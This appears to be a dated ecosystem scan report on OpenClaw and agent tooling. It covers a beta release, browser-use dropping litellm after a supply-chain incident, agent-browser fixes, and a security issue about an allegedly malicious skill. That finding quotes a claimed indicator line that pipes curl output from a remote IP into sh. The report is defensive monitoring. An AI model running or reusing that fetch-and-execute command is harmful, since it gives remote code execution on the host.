# OpenClaw / Agent Ecosystem Afternoon Scan

## Scope
- Domain: OpenClaw ecosystem, agent tooling, browser automation
- Intent: repo-radar / usage-radar
- Time window: since earlier scan today; light afternoon check
- Research date: 2026-03-25 22:44 Asia/Saigon
- Method: primary-source-first checks via GitHub release + issue/PR endpoints; no broad web expansion
- Constraint note: Brave web search unavailable in this environment, so this run stayed on direct source checks

## Executive summary
- OpenClaw shipped a fresh prerelease `v2026.3.24-beta.2` with behavior-impacting fixes around outbound media/fs policy alignment and Node-version/update preflights.
- A new OpenClaw security issue alleges a malicious ClawHub skill with reverse-shell behavior on load; if confirmed, this materially changes skill-install risk posture.
- `browser-use` published `0.12.5` as a security response: `litellm` is no longer a core dependency after the March 24 supply-chain incident.
- `agent-browser` had same-day operator-facing fixes around text entry fidelity and `console --clear`, both small but practical for automation loops.

## Key findings

### 1. OpenClaw beta release with operator-visible behavior changes
- What happened: OpenClaw published prerelease `v2026.3.24-beta.2`.
- Why it matters: this is not just packaging churn; the release notes call out behavior changes for outbound media/local-file sending and `openclaw update` preflight behavior on older Node 22 installs.
- Evidence:
  - outbound media/local files now align with configured fs policy, preserving host-local and inbound-media sending when `workspaceOnly` is off
  - Node support floor lowered to `22.14+`
  - `openclaw update` now checks `engines.node` before trying a global install
- Links:
  - Release: https://github.com/openclaw/openclaw/releases/tag/v2026.3.24-beta.2
  - API snapshot used: https://api.github.com/repos/openclaw/openclaw/releases/301236076

### 2. New OpenClaw security report: alleged malicious skill with reverse-shell behavior
- What happened: a new OpenClaw issue reports `noreplyboter/polymarket-all-in-one` as a malicious skill that allegedly runs `curl ... | sh` from `scripts/polymarket.py` during load.
- Why it matters: if validated, this is a direct ecosystem-safety event, not generic news. It would strengthen the case for stricter skill vetting / sandbox defaults / caution around third-party skill warmup.
- Evidence:
  - issue opened 2026-03-25T15:43Z and labeled `security`
  - report includes claimed IOC `curl -s http://54.91.154.110:13338/ | sh`
- Caveat: this is currently an issue report, not a maintainer-confirmed advisory.
- Links:
  - Issue: https://github.com/openclaw/openclaw/issues/54541
  - API snapshot used: https://api.github.com/repos/openclaw/openclaw/issues/54541

### 3. browser-use 0.12.5 removes `litellm` from core install path after supply-chain scare
- What happened: `browser-use` released `0.12.5` the same day, explicitly removing `litellm` from core dependencies in response to the March 24 backdoored-package incident.
- Why it matters: this is a practical usage change. Operators using `browser-use` now need to install `litellm` separately if they still depend on `ChatLiteLLM`; default installs become safer and leaner.
- Evidence:
  - release note states `pip install browser-use` no longer installs `litellm`
  - `ChatLiteLLM` wrapper remains, but `litellm` becomes opt-in
- Links:
  - Release: https://github.com/browser-use/browser-use/releases/tag/0.12.5
  - API snapshot used: https://api.github.com/repos/browser-use/browser-use/releases/301004692

### 4. agent-browser landed two same-day workflow fixes that reduce flaky operator loops
- What happened:
  - PR #1014 changed keyboard typing to go through higher-level text insertion for printable characters instead of relying on one raw key-dispatch path.
  - PR #1015 made `console --clear` actually clear the daemon console buffer instead of being a no-op.
- Why it matters: both affect day-to-day automation behavior. Text-entry fidelity matters for forms/chat inputs, and working console clearing is useful for iterative debugging loops.
- Links:
  - PR #1014: https://github.com/vercel-labs/agent-browser/pull/1014
  - PR #1015: https://github.com/vercel-labs/agent-browser/pull/1015
  - Release page (latest available artifact release in same window): https://github.com/vercel-labs/agent-browser/releases/tag/v0.22.2

## Practical takeaways
- For OpenClaw installs pinned on older Node 22, the new prerelease reduces update friction; still prefer Node 24 for less surprise.
- Treat third-party skills as higher-risk until malicious-skill allegations are resolved; avoid blind install/warmup from unreviewed publishers.
- For `browser-use`, audit whether any environment relied on transitive `litellm`; future setup docs should make that dependency explicit.
- For `agent-browser`, retest any flaky text-entry flows and log-cleanup scripts because both behaviors changed today.

## Implications for OpenClaw
- Consider adding a repo note or checklist for skill vetting / sandbox assumptions when tracking ecosystem tools.
- Track whether the malicious-skill report becomes a confirmed advisory or takedown, not just an issue.
- Update any browser-use integration notes to mention explicit `litellm` install when needed.
- Watch whether OpenClaw’s new fs-policy alignment affects existing media/file-send workflows in real deployments.

## Follow-up actions
- [ ] Check whether OpenClaw maintainers publish a formal advisory or takedown related to issue #54541.
- [ ] Add a short note on `browser-use` dependency change to future usage guidance if it persists beyond emergency patching.
- [ ] Re-check OpenClaw release / changelog tomorrow for follow-up beta notes or a stable release.
- [ ] Watch agent-browser for a tagged release that explicitly bundles the typing + console fixes.
